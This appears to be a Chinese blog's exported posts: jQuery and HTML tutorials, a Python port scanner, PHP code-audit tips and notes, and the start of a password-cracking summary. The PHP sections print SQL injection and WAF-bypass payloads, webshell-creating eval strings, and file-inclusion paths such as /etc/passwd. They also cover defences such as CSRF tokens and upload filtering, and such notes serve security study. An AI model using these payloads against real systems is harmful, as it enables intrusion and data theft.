&lt;tr&gt;&lt;td&gt;酸奶&lt;/td&gt;&lt;td&gt;奶制品&lt;/td&gt;&lt;td&gt;9.9&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;苹果&lt;/td&gt;&lt;td&gt;水果&lt;/td&gt;&lt;td&gt;2.5&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;div id=&quot;buy&quot; style=&quot;border: 1px solid #999;margin-top: 10px;text-align: center;&quot;&gt; &lt;h4 style=&quot;color: red;&quot;&gt;购物车&lt;/h4&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 大家运行后可以看到，这次我做了一个类似网上购物时选购商品的页面： 每点击一个商品，我们就把这一行从表格中删除，并加到下方的“购物车”框中。其实改动并不大，表格还是刚才的表格，Jquery中增加了一个函数： $(&quot;.hovertable td&quot;).click(function(event){ var name = $(event.target.parentNode).children(&quot;td:first&quot;).html(); var price = $(event.target.parentNode).children(&quot;td:last&quot;).html(); $(event.target.parentNode).remove(); $(&quot;#buy&quot;).append(&apos;&lt;p&gt;&apos; + name + &quot;/&quot; + price + &apos;元&lt;/p&gt;&apos;); }); 就是一个当某个格子被点击时，执行的代码。看第一行，我们会发现，event.target.parentNode我认识，但为什么要把它放在$()中间？ 这就涉及到DOM对象转换成Jquery对象的过程。大家用Jquery多了就会喜欢Jquery的简洁，但DOM对象并不能使用Jquery的方法，所以Jquery其实给了大家一个方式，能把DOM对象转换成Jquery对象，也就是把DOM对象直接放到$()中即可。 比如我们一般写的$(document).ready，其实就是把DOM对象document转换成了Jquery对象，使用Jquery的方法ready。 这里也一样，把event.target.parentNode转换成了Jquery的对象。后面一个children其实是Jquery下我没讲到的“遍历函数”。遍历函数其实就是遍历某个对象，比如我们一个table对象，要取其中每行的内容，就可以用each方法遍历。 children方法用的也很多，意思是取满足条件的某子元素。大家可以看到，children(“td:first”)，就是取第一个td元素。也就是这一行的第一个格子，再用html()取到其内容，保存到变量name里。 var price = $(event.target.parentNode).children(&quot;td:last&quot;).html();也是一个道理，取最后一个格子内容。 于是这里就得到了我点击的这一行的商品名和价格。然后用$(event.target.parentNode).remove();把这一行移除，再用append把内容加到“购物车”里。就制成了这个简单的选购商品的页面。 本文内容转自：离别歌]]></content>
      <tags>
        <tag>前端</tag>
        <tag>编程</tag>
        <tag>JQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML学习笔记]]></title>
    <url>%2F2016%2F08%2F26%2FHTML%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[超文本标记语言，标准通用标记语言下的一个应用。“超文本”就是指页面内可以包含图片、链接，甚至音乐、程序等非文字元素。超文本标记语言的结构包括“头”部分（英语：Head）、和“主体”部分（英语：Body），其中“头”部提供关于网页的信息，“主体”部分提供网页的具体内容。 HTML学习笔记 HTML 常用标签演示 本页演示的所有标签均为浏览器默认效果。【基础】&lt;div&gt; 定义文档中的节（块元素，无任何属性）&lt;span&gt; 定义文档中的节（内联元素，无任何属性）&lt;h1&gt; to &lt;h6&gt; 定义标题（通常使用粗体显示。注意：单个页面内最好只使用1个H1标签）H1 标题H2 标题H3 标题H4 标题H5 标题H6 标题&lt;p&gt; 定义段落&lt;hr&gt; 定义水平线（本页中的分割线均为 &lt;hr&gt; 标签）&lt;header&gt; 定义 section 或页面的头部&lt;footer&gt; 定义 section 或页面的尾部&lt;article&gt; 定义文章&lt;section&gt; 定义文档中的节&lt;aside&gt; 定义文档内容相关的内容&lt;nav&gt; 定义导航header 头部footer 尾部article 内容section 内容aside 内容nav 内容&lt;details&gt; 定义细节内容&lt;summary&gt; 定义 details 的标题All pages and graphics on this web site are the property of W3School.HTML 5This document teaches you everything you have to learn about HTML 5.【列表】&lt;ul&gt; 定义无序列表（通常列表前会有项目符号） &lt;li&gt; 定义列表的项目 张三 李四&lt;ol&gt; 定义有序列表。（通常列表前会有数字符号） &lt;li&gt; 定义列表的项目 张三 李四&lt;dl&gt; 定义定义列表 &lt;dt&gt; 定义定义列表中的项目 &lt;dd&gt; 定义定义列表中项目的描述 CF穿越火线 CF是一个很好玩的游戏啊，一般人玩不了..【表格】&lt;table&gt; 定义表格&lt;caption&gt; 定义表格标题&lt;thead&gt; 定义表格中的表头内容&lt;tfoot&gt; 定义表格中的表注内容（脚注）&lt;tbody&gt; 定义表格中的主体内容&lt;tr&gt; 定义表格中的行&lt;th&gt; 定义表格中的表头单元格（通常使用粗体显示）&lt;td&gt; 定义表格中的单元 table 结构标准顺序如下：&lt;table&gt; &lt;caption&gt;&lt;/caption&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tfoot&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tfoot&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt;※ 虽然 tfoot 放在了 tbody 之前，浏览器依然会将 tfoot 显示在 tbody 之后，而且这样做能让浏览器在获得所有表格内的数据前显示表注。 表格标题 表头 ID 表头 姓名 表头 日期 表注 这是编号 表注 这是假名 表注 这是添加日期 1 张三 2019-09-09 2 李四 2016-6-6 自带边框样式 表头 ID 表头 姓名 表头 日期 表注 这是编号 表注 这是假名 表注 这是添加日期 1 张三 20019-09-09 2 李四 2016-6-6 【表单】 &lt;form&gt; 定义表单&lt;fieldset&gt; 定义围绕表单中元素的边框（通常四周会有缩进，并显示围绕的边框）&lt;legend&gt; 定义 fieldset 元素的标题 标题 内容&lt;select&gt; 定义选择列表（下拉列表、多选列表）&lt;optgroup&gt; 定义选择列表中相关选项的组合&lt;option&gt; 定义选择列表中的选项 张三 张三的儿子 张三的孙女 李四 李四的女儿 李四的孙子 滚动列表形式 张三 张三的儿子 张三的孙女 李四 李四的女儿 李四的孙子 多选列表 张三 张三的儿子 张三的孙女 李四 李四的女儿 李四的孙子 &lt;input&gt; 定义输入控件（如果浏览器不支持 HTML5 新的类型，那么会使用文本域替代）文本域 type=”text” 密码域 type=”password” 复选框 type=”checkbox” A B C单选按钮 type=”radio” 组A:① ② 组B:Ⅰ Ⅱ文件域 type=”file” 图像域 type=”image” （可用做提交按钮）隐藏域 type=”hidden” （当然是看不见的了）普通按钮 type=”button” 重置按钮 type=”reset” 提交按钮 type=”submit” email 域 type=”email” （若有输入内容，则会验证格式是否符合 email）url 域 type=”url” （若有输入内容，则会验证格式是否符合 url）数值域 type=”number” （若有设置最大值或最小值，则会验证数字是否在最大最小值之内）数值范围域 type=”range” （通过拖动滑块来选择数值）日期域 type=”date” （会调用浏览器自带的日期选择器，可设置的类型：date, month, week, time, datetime, datetime-local） type=”month” type=”week” type=”time” type=”datetime” type=”datetime-local” 色值域 type=”color” （会调用浏览器自带的颜色选择器）搜索域 type=”search” （用于搜索，站内搜索或 Google 搜索等，在输入框内容右侧通常会出现清除按钮）&lt;datalist&gt; 定义 input 元素的选项列表 &lt;keygen&gt; 定义生成秘钥&lt;output&gt; 定义多行的文本输入控件&lt;label&gt; 定义 input 元素的标注点击这里也可以选中&lt;textarea&gt; 定义多行的文本输入控件&lt;button&gt; 定义按钮（与 input 不同的是，button 内部可以放置更多的内容，比如文本或图像） 普通按钮 重置按钮 提交按钮【格式】&lt;blockquote&gt; 定义长的引用（通常四周会有缩进）WEB标准不是某一个标准，而是一系列标准的集合。网页主要由三部分组成：结构（Structure）、表现（Presentation）和行为（Behavior）。对应的标准也分三方面：结构化标准语言主要包括XHTML和XML，表现标准语言主要包括CSS，行为标准主要包括对象模型（如W3C DOM）、ECMAScript等。这些标准大部分由W3C起草和发布，也有一些是其他标准组织制订的标准，比如ECMA（European Computer Manufacturers Association）的ECMAScript标准。&lt;pre&gt; 定义预格式文本（通常会保留空格及换行符，并使用等宽字体显示，很适合用来表示计算机代码）for(var i=0; i]]></content>
      <tags>
        <tag>前端</tag>
        <tag>编程</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python实现端口扫描]]></title>
    <url>%2F2016%2F08%2F24%2FPython%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%2F</url>
    <content type="text"><![CDATA[端口扫描端口扫描工具（Port Scanner）指用于探测服务器或主机开放端口情况的工具。常被计算机管理员用于确认安全策略，同时被攻击者用于识别目标主机上的可运作的网络服务。端口扫描定义是客户端向一定范围的服务器端口发送对应请求，以此确认可使用的端口。虽然其本身并不是恶意的网络活动，但也是网络攻击者探测目标主机服务，以利用该服务的已知漏洞的重要手段。端口扫描的主要用途仍然只是确认远程机器某个服务的可用性。扫描多个主机以获取特定的某个端口被称为端口清扫（Portsweep），以此获取特定的服务。例如，基于SQL服务的计算机蠕虫就会清扫大量主机的同一端口以在 1433 端口上建立TCP连接。 实现原理最简单的端口扫描工具使用TCP连接扫描的方式，即利用操作系统原生的网络功能，且通常作为SYN扫描的替代选项。Nmap将这种模式称为连接扫描，因为使用了类似Unix系统的connect()命令。如果该端口是开放的，操作系统就能完成TCP三次握手，然后端口扫描工具会立即关闭刚建立的该连接，防止拒绝服务攻击。这种扫描模式的优势是用户无需特殊权限。但使用操作系统原生网络功能不能实现底层控制，因此这种扫描方式并不流行。并且TCP扫描很容易被发现，尤其作为端口清扫的手段：这些服务会记录发送者的IP地址，入侵检测系统可能触发警报。还有另外一种扫描方式是SYN扫描，端口扫描工具不使用操作系统原生网络功能，而是自行生成、发送IP数据包，并监控其回应。这种扫描模式被称为“半开放扫描”，因为它从不建立完整的TCP连接。端口扫描工具生成一个SYN包，如果目标端口开放，则会返回SYN-ACK包。扫描端回应一个RST包，然后在握手完成前关闭连接。如果端口关闭了但未使用过滤，目标端口应该会持续返回RST包。这种粗略的网络利用方式有几个优点：给扫描工具全权控制数据包发送和等待回应时长的权力，允许更详细的回应分析。关于哪一种对目标主机的扫描方式更不具备入侵性存在一些争议，但SYN扫描的优势是从不会建立完整的连接。然而，RST包可能导致网络堵塞，尤其是一些简单如打印机之类的网络设备。此次使用的是第一种扫描方式，直接利用操作系统的socket连接接口，初步测试目标服务器的端口是否可以连接，如果可以则返回端口打开状态 实现步骤可以把程序分成下面几部分： 1.读取端口及目标服务器 2.测试TCP端口连接 3.输出开放端口结果 1.读取端口及目标服务器直接把目标服务器和端口范围作为参数传给我们的程序，程序运行参数： python port_scan.py - 程序中使用sys.argv[]来读取并初步处理,具体的语法请参考python sys.argv[]用法： #!/usr/bin/python # -*- coding: UTF-8 -*- &apos;&apos;&apos; @Author：joy_nick @博客：http://byd.dropsec.xyz/ &apos;&apos;&apos; import sys # portscan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt; host = sys.argv[1] portstrs = sys.argv[2].split(&apos;-&apos;) start_port = int(portstrs[0]) end_port = int(portstrs[1]) 2.测试TCP端口连接我们进入到一个循环，在这个循环中依次对端口范围内的端口进行连接测试。 首先要在文件开始部分引入 socket 包： from socket import * 连接测试方法是： 创建socket 调用connect()函数 关闭连接 依次实现如下： 获取目标IP地址： target_ip = gethostbyname(host) 进入循环开始连接： opened_ports = [] for port in range(start_port, end_port + 1): sock = socket(AF_INET, SOCK_STREAM) sock.settimeout(10) result = sock.connect_ex((target_ip, port)) if result == 0: opened_ports.append(port) 附： 1.Python socket()介绍及使用方法 2.Python socket编程 3.输出开放端口结果这一步骤很简单，只需要打印opened_ports列表： print(&quot;Opened ports:&quot;) for i in opened_ports: print(i) 完整的代码如下： #!/usr/bin/python # -*- coding: utf-8 -*- &apos;&apos;&apos; @Author：joy_nick @博客：http://byd.dropsec.xyz/ &apos;&apos;&apos; import sys from socket import * # port_scan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt; host = sys.argv[1] portstrs = sys.argv[2].split(&apos;-&apos;) start_port = int(portstrs[0]) end_port = int(portstrs[1]) target_ip = gethostbyname(host) opened_ports = [] for port in range(start_port, end_port): sock = socket(AF_INET, SOCK_STREAM) sock.settimeout(10) result = sock.connect_ex((target_ip, port)) if result == 0: opened_ports.append(port) print(&quot;Opened ports:&quot;) for i in opened_ports: print(i) 执行测试命令为： python port_scan.py 192.168.1.200 21-23 多线程端口扫描器上面的简单程序中，我们依次测试每个端口，如果要提高性能，可以考虑采用多线程的方式。 改进的方式如下： 1.把TCP连接测试封装进函数 2.每次循环都创建一个线程来执行1中的扫描函数 3.为了简化实现，把开放端口输出步骤写入到1的测试函数中 首先引入thread包，这个包是Python多线程实现需要的： import thread 实现TCP测试函数，需要注意print输出时候需要加锁，如果不加锁可能会出现多个输出混合在一起的错误状态，而锁需要在程序启动时创建，从而能让新建的线程共享这个锁： def tcp_test(port): sock = socket(AF_INET, SOCK_STREAM) sock.settimeout(10) result = sock.connect_ex((target_ip, port)) if result == 0: lock.acquire() print &quot;Opened Port:&quot;,port lock.release() 附： 1.Python的锁 2.多线程lock.acquire() 注意当输出执行完后要释放锁lock。 输入的处理及lock的创建可以放在main函数中： if __name__==&apos;__main__&apos;: # portscan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt; host = sys.argv[1] portstrs = sys.argv[2].split(&apos;-&apos;) start_port = int(portstrs[0]) end_port = int(portstrs[1]) target_ip = gethostbyname(host) lock = thread.allocate_lock() 然后修改for循环： for port in range(start_port, end_port): thread.start_new_thread(tcp_test, (port,)) thread.start_new_thread 用来创建一个线程，该函数的第一个参数是一个线程中执行的函数，第二个参数必须是个元组，作为函数的输入，由于 tcp\_test 函数只有一个参数，所以我们使用(port,)这种形式表示这个参数为元组。 thread.start_new_thread参考资料如下： 这个是thread.start_new_thread(function,args[,kwargs])函数原型，其中function参数是你将要调用的线程函数；args是讲传递给你的线程函数的参数，它必须是个tuple类型（元组）；而kwargs是可选的参数。线程的结束一般依靠线程函数的自然结束；也可以在线程函数中调用thread.exit()，它抛出SystemExit exception，达到退出线程的目的。 这里运行程序会报错： Unhandled exception in thread started by sys.excepthook is missing lost sys.stderr 网上解释为： 第一个问题：因为主进程已经结束，相关的资源已经释放，而线程还在后台运行，所以会导致线程找不到相关的资源和定义第二个问题：因为主程序结束的时候，并没有等待子线程结束，也没有强制关闭子线程，因此还在后台运行，有两个办法可以让他们同时结束，一个办法是在在构建进程的时候增加参数 deamon=True, 第二个办法就是在程序最后增加thread1.join(),thread2.join() 但是并没有什么卵用，我的解决办法为： 在主函数上加里一个time.sleep(1) 完整的程序代码如下： #!/usr/bin/python # -*- coding: UTF-8 -*- &apos;&apos;&apos; @Author：joy_nick @博客：http://byd.dropsec.xyz/ &apos;&apos;&apos; import sys import thread from socket import * def tcp_test(port): sock = socket(AF_INET, SOCK_STREAM) sock.settimeout(10) result = sock.connect_ex((target_ip, port)) if result == 0: lock.acquire() print &apos;主机:%s&apos;%(target_ip) print &quot;开放的端口为:&quot;,port print &apos;\n&apos; lock.release() thread.exit() if __name__==&apos;__main__&apos;: # portscan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt; host = sys.argv[1] portstrs = sys.argv[2].split(&apos;-&apos;) start_port = int(portstrs[0]) end_port = int(portstrs[1]) target_ip = gethostbyname(host) lock = thread.allocate_lock() for port in range(start_port, end_port): thread.start_new_thread(tcp_test, (port,)) time.sleep(1) 运行实例如下：]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>编程</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP代码审计技巧]]></title>
    <url>%2F2016%2F08%2F23%2FPHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[1、$_SERVER[‘PHP_SELF’]和$_SERVER[‘QUERY_STRING’]，而$_SERVER并没有转义，造成了注入。 例如： /easy/index.php/aaa&apos;,(select/**/if((select/**/ord(substr(user(),1,1)))=114,sleep(3),0)),1)# 2、update更新时没有重构更新序列，导致更新其他关键字段 例如： id=1&amp;data=1991-03-16&amp;money=10000000 3、在 php中 如果使用了一个未定义的常量，PHP 假定想要的是该常量本身的名字，如同用字符串调用它一样（CONSTANT 对应 “CONSTANT”）。此时将发出一个 E_NOTICE 级的错误（参考http://php.net/manual/zh/language.constants.syntax.php） 例如： 未定义常量if(IN_ADMIN != TRUE) 等式不成立，非0、null都为true 4、PHP中自编写对标签的过滤或关键字过滤，应放在strip_tags等去除函数之后，否则引起过滤绕过。 例如： function mystrip_tags($string) { $string = remove_xss($string); $string = new_html_special_chars($string); $string = strip_tags($string);//remove_xss在strip_tags之前调用，所以很明显可以利用strip_tags函数绕过,在关键字中插入html标记. return $string; } 对关键字过滤之后存在字符替换、html去除等操作可构造多余字符绕过。 例如：提交 user/**/W&lt;a&gt;HERE/**/IF((S&lt;a&gt;ELECT/**/A&lt;a&gt;SCII(S&lt;a&gt;UBSTRING(PASSWORD,1,1))F&lt;a&gt;ROM/**/ts_user/**/L&lt;a&gt;IMIT 1)=101,1=S&lt;a&gt;LEEP(2.02),0)%23 由于全局关键字过滤之后存在strip_tags()函数可绕过。 5、当可控变量进入双引号中时可形成webshell 例如： $a = &quot;${@eval($_POST[s])}&quot;; $a = &quot;${${eval($_POST[s])}}&quot;; 因此代码执行使用${file_put_contents($_GET[f],$_GET[p])}可以生成webshell。 6、宽字节转编码过程中出现宽字节注入 例如：测试输入 %e5%5c%5c&#39; 两个\\&#39;则单引号出来 7、构造查询语句时无法删除目标表中不存在字段时可使用mysql多表查询绕过。 例如： select uid,password from users,admins；(uid存在于users、password存在于admins） 8、mysql中（反引号）能作为注释符，且会自动闭合末尾没有闭合的反引号。无法使用注释符的情况下使用别名as+反引号可闭合其后语句。 例如： select username,password from pre_common_statuser as ` as statistic from common_stat where uid=1 此处（password from pre_common_statuser as ）为注入语句，使用别名as与自带无视其后语句。 9、mysql的类型强制转换可绕过PHP中empty()函数对0的false返回。 例如：提交/?test=0axxx -&gt; empty($_GET[‘test’]) =&gt; 返回真 10、存在全局过滤时观察过滤条件是否有if判断进入，cms可能存在自定义safekey不启用全局过滤。通过程序遗留或者原有界面输出safekey导致绕过。 例如： if($config[&apos;sy_istemplate&apos;]!=&apos;1&apos; || md5(md5($config[&apos;sy_safekey&apos;]).$_GET[&apos;m&apos;])!=$_POST[&apos;safekey&apos;]) { foreach($_POST as $id=&gt;$v){ safesql($id,$v,&quot;POST&quot;,$config); $id = sfkeyword($id,$config); $v = sfkeyword($v,$config); $_POST[$id]=common_htmlspecialchars($v); } } 11、由于全局过滤存在白名单限定功能，可使用无用参数带入绕过。例如： if ($webscan_switch&amp;&amp;webscan_white($webscan_white_directory,$webscan_white_url)) 其中具体过滤代码如下： //后台白名单,后台操作将不会拦截,添加”|”隔开白名单目录下面默认是网址带 admin /dede/ 放行 $webscan_white_directory=’admin|/dede\/|/install/‘; //url白名单,可以自定义添加url白名单,默认是对phpcms的后台url放行 //写法：比如phpcms 后台操作url index.php?m=admin php168的文章提交链接post.php?job=postnew&amp;step=post ,dedecms 空间设置edit_space_info.php $webscan_white_url = array(‘index.php’ =&gt; ‘admin_dir=admin’,’post.php’ =&gt; ‘job=postnew&amp;step=post’,’edit_space_info.php’=&gt;’’); 只要让传入参数存在白名单目录或参数即可绕过。 利用白名单目录： http://www.target.com/index.php/dede/?m=foo&amp;c=bar&amp;id=1‘ and 1=2 union select xxx 由于请求中包含了白名单目录/dede/，所以放行。 利用白名单参数： http://www.target.com/index.php?m=foo&amp;c=bar&amp;admin_dir=admin&amp;id=1‘ and 1=2 union select xxx 请求中包含了白名单参数所以放行。 12、字符串截断函数获取定长数据，截取\或\’前一位，闭合语句。利用条件必须是存在两个可控参数，前闭合，后注入。例如： if (strlen($u_email)&gt;32) { $u_email = substring($u_email,32);} if (strlen($u_qq)&gt;16) { $u_qq = substring($u_qq,16);} if (strlen($u_phone)&gt;16) { $u_phone = substring($u_phone,16);} $u_phone=123456789012345\ 带入： UPDATE mac_user SET u_qq=&apos;$u_qq&apos;,u_email=&apos;$u_email&apos;,u_phone=&apos;123456789012345\&apos;,u_question=&apos;$u_question&apos;,u_answer=&apos;$u_answer&apos;,u_password=&apos;$u_password&apos; WHERE u_id=1 13、过滤了空格，逗号的注入，可使用括号包裹绕过。具体如遇到select from（关键字空格判断的正则，且剔除/**/等）可使用括号包裹查询字段绕过。例如： select(user)from(website); 另外一种方式： select{x table_name}from{x information_schema.tables} select{x(name)}from{x(manager)}; select{wooyun&apos;zone&apos;}from{mysql.user} select{x+table_name}from{x(information_schema.tables)} 14、由于PHP弱类型验证机制，导致==、in_array()等可通过强制转换绕过验证。例如： in_array($_GET[‘x’],array(1,2,3,4,5)) 访问?test=’1’testtest可判断成功。 15、WAF或者过滤了and|or的情况可以使用&amp;&amp;与||进行盲注。 FALSE的情况： 1 || 0 TRUE的情况： 1 || 1 例如： http://demo.74cms.com/user/user\_invited.php?id=1%20||%20strcmp(substr(user(),1,13),char(114,111,111,116,64,108,111,99,97,108,104,111,115,116))&amp;act=invited 16、windows下php中访问文件名使用”&lt;” “&gt;”将会被替换成”*” “?”，分别代表N个任意字符与1个任意字符。例如： file_get_contents(“/images/“.$_GET[‘a’].”.jpg”); 可使用test.php?a=../a&lt;%00访问对应php文件。]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>WAF绕过</tag>
        <tag>PHP</tag>
        <tag>webshell</tag>
        <tag>MySQL</tag>
        <tag>SQL注入</tag>
        <tag>代码审计</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《代码审计》读书笔记]]></title>
    <url>%2F2016%2F08%2F18%2F%E3%80%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[PHP核心配置文件： 1.register_globals=Off(全局变量注册开关) 2.allow_url_include=Off(是否允许包含远程文件)与此类似的还有allow_url_fopen 3.magic_quotes_gpc=On(魔术引号自动过滤)会自动在单引号、双引号、反斜杠、空字节(NULL)的前面加上反斜,但是在PHP5中不会过滤$SERVER变量所以可以利用client-ip、referer等漏洞 4.magic_quotes_runtime(魔术引号自动过滤)和上面一样，只是它只对从数据库或者文件中获取的数据进行过滤 5.magic_quotes_sybase(魔术引号自动过滤)只是将单引号转为双引号，转义空字节 6.safe_mode=on(安全模式)PHP5.4之后取消 7.open_basedir(PHP可访问目录)多个用;隔开 8.disable_functions(禁用函数)例如可以=phpinfo、eval、passthru、exec、system 9.display_errors和error_reporting=Off(错误显示) 常见的代码审计思路 1.根据敏感关键字回溯参数传递过程 2.查找可控变量，正向追踪变量传递过程 3.寻找敏感功能点，通读功能点代码 4.直接通读全文代码 文件上传时可以测试文件名是否存在SQL注入. 二次注入原理图,实例请看sqli-labs-24 SQL请求头注入：user-agent/referer/client-ip/x-forward-for 对宽字节注入的挖掘主要看如下关键字： SET NAMES character_set_client=gbk mysql_set_charset(&apos;gbk&apos;) 二次urldecode注入：1.php?id=1%2527 intval等字符转换intval(&quot;1&#39; union select &quot;) 输出：1 关于宽字节注入的推荐解决方法： 1.在执行查询前先执行SET NAMES &apos;gbk&apos;设置编码，设置character_set_client=binary 2.使用mysql_set_charset(&apos;gbk&apos;)设置编码，然后使用mysql_real_escasp_string()函数过滤参数 3.使用pdo方式，在PHP5.3.6及以下版本需要设置setAttribute来禁用prepared statements的防真效果 对于CSRF的防御： 1.增加token/referer验证避免img标签请求的攻击 2.增加验证码 Token实现测试代码： &lt;?php session_start(); function set_token() { $_SESSION[&apos;token&apos;] = md5(time()+rand(1,1000)); echo $_SESSION[&apos;token&apos;]; echo &apos;&lt;/br&gt;&apos;; } function check_token() { if(isset($_POST[&apos;token&apos;])&amp;&amp;$_POST[&apos;token&apos;] === $_SESSION[&apos;token&apos;]) return true; else return false; } if(isset($_SESSION[&apos;token&apos;])&amp;&amp;check_token()) { echo &quot;success&quot;; echo &apos;&lt;/br&gt;&apos;; } else { echo &quot;failed&quot;; echo &apos;&lt;/br&gt;&apos;; } set_token(); ?&gt; &lt;form method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;?=$_SESSION[&apos;token&apos;]?&gt;&quot;&gt; &lt;input type=&quot;submit&quot;/&gt; &lt;/form&gt; 文件包含函数的区别： include()、include_once()在文件包含时即使遇到错误，下面的代码依然会继续执行 require()、require_once()则会直接报错退出程序 windows下可以包含日志文件 linux下可以包含/proc/self/environ(链接当前正在运行环境的进程)、/etc/passwd(密码文件) 等文件 php://filter/ PHP输入输出流读取文件 文件上传函数move_uploaded_file() 在上传文件时，在文件名后面加个空格（%20,或者%81-%99)，有时候可以绕过黑名单限制。 文件上传防御： 1.白名单方式过滤文件扩展名，使用in_array或者===来对比扩展名 2.保存文件时重命名文件，文件命名规则采用时间戳的拼接随机数的MD5方式&quot;md5(time()+rand(1,1000))&quot;. 代码执行漏洞函数： eval(),assert(),preg_replace(),call_user_func(),call_user_func_array(),array_map() mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject )搜索subject中匹配pattern,用replacement替换。如果pattern处存在/e参数，则replacement的值会被当成PHP代码来执行。 命令执行漏洞函数： system(),exec(),shell_exec(),passyhru(),pcntl_exec(),popen(),proc_open(),` 命令执行防注入函数： escapeshellcmd(),过滤整条命令(加^) &lt;?php echo (escapeshellcmd($_GET[&apos;cmd&apos;])); ?&gt; ?cmd=whoami() 输出：whoami^() escapesshellarg(),保证传入命令的参数是以字符串的形式存在 &lt;?php echo &apos;ls &apos;.escapeshellarg(&apos;cmd&quot;&apos;); ?&gt; 输出：ls &quot;cmd &quot; is_numeric()函数使用十六进制绕过 ==在判断之前先做变量类型转换，即只判断值 ===不会转换，即既判断值还判断类型 %00=NULL=0 http头注入常见的:user-agent,referer,client-ip/x-forward-for $_SERVER和$_FILES变量不受GPC保护 显示错误信息的函数开关:display_errors和error_reporting PHP是基于C开发，%00在URL编码后市\0，\0在C语言中是字符串的结束符。 iconv函数字符编码转换过程中遇到不能处理的字符串则后续的字符串也不会处理，导致截断（char(128)到char(255)之间都可以） php://输入输出流 php://input可以访问请求的原始数据的只读流，即可以直接读取到POST上没有经过解析的原始数据。 php://output是一个只写流，将流数据输出 php://filter是一个文件操作协议，可以对磁盘中的文件进行读写操作 php://filter/write=string.rot13/resource=example.txt,&quot;hello world&quot; php://filter/convert.base64-encode/resource=index.php PHP代码解析标签 脚本标签: &lt;script language=&quot;php&quot;&gt;...&lt;/script&gt; 短标签：&lt;?...?&gt;,需要php.ini中short_open_tag=on,默认是on asp标签：&lt;%...%&gt;,需要php.ini中asp_tags=on，默认是off client-ip的正则规则：^\d+\.\d+\.\d+\.\d+$ test.php%00jpg mysql报错注入的函数：floor(),updatexml(),extractvalue() 具体介绍请参考：MySql注入总结 windows findfirstfile利用：即使用&lt;,&gt;来代替不可知的文件名部分，如123.txt可以使用1&lt;&lt;来替换。 PHP中单引号代表纯字符串，双引号则是会解析中间的变量： &lt;?php $a=&quot;${@phpinfo()}&quot;;?&gt; #第一个字符为@ &lt;?php $a=&quot;${ phpinfo()}&quot;;?&gt; #第一个字符为空格 &lt;?php $a=&quot;${ phpinfo()}&quot;;?&gt; #第一个字符为TAB &lt;?php $a=&quot;${/**/phpinfo()}&quot;;?&gt; #第一个字符为注释符 &lt;?php $a=&quot;${ phpinfo()}&quot;;?&gt; #第一个字符为回车换行 &lt;?php $a=&quot;${+phpinfo()}&quot;;?&gt; #第一个字符为+ &lt;?php $a=&quot;${-phpinfo()}&quot;;?&gt; #第一个字符为- &lt;?php $a=&quot;${!phpinfo()}&quot;;?&gt; #第一个字符为！ 此外还有~，\等 对称加密算法：DES,3DES,TDEA,RC2,RC4,IDEA,AES 非对称加密：RSA 单向加密：MD4,MD5,sha1 验证码绕过： 1.不刷新直接绕过 2.暴力破解 3.机器识别 4.打码平台 用户登录漏洞： 1.撞库漏洞 用户名密码错误次数都无限制 单时间段内用户的密码错误次数限制 单时间段内IP登陆错误次数限制 2.API登陆 最后附上一个搜集的PHP代码审计脑图]]></content>
      <tags>
        <tag>XSS</tag>
        <tag>WAF绕过</tag>
        <tag>PHP</tag>
        <tag>命令执行</tag>
        <tag>SQL注入</tag>
        <tag>代码审计</tag>
        <tag>安全开发</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试:密码破解总结]]></title>
    <url>%2F2016%2F08%2F17%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%9A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[0x00 前言一次渗透测试的过程总会涉及到”密码”与”加解密”.在测试的过程中,对弱口令的尝试是必不可少的过程。 0x01 整理一份优秀的字典想破解密码,要求我们已经”拥有”别人的密码.要整理一份优秀的字典,可以参考各大网站泄漏数据库,将密码(明文)字段收集后,依出现频率先后生成字典. 这里使用一个对已知的字典文件根据使用频率排序并输出的python脚本： #!/bin/bash/python #+------------------------------+ #@Author:Joy_nick #@Blog:http://byd.dropsec.xyz/ #+------------------------------+ import sys from collections import Counter file = open(sys.argv[1], &apos;r&apos;) readlist = [] count_times = [] for line in file.readlines(): line = line.strip(&apos;\r\n &apos;) readlist.append(line) sortlist = Counter(readlist).most_common() for line in sortlist: print line[0] 示例： 0x02 一手称心如意的工具集欲善其事,须利其器.密码枚举工具举一些例子： Hydra :各种服务账户密码猜解 Medusa : 类似Hydra Patator : Python多协议，全能暴力破解，模块化设计测试工具 Hashcat : GPU哈希破解 BurpSuite : 多线程密码枚举 Rcracki : 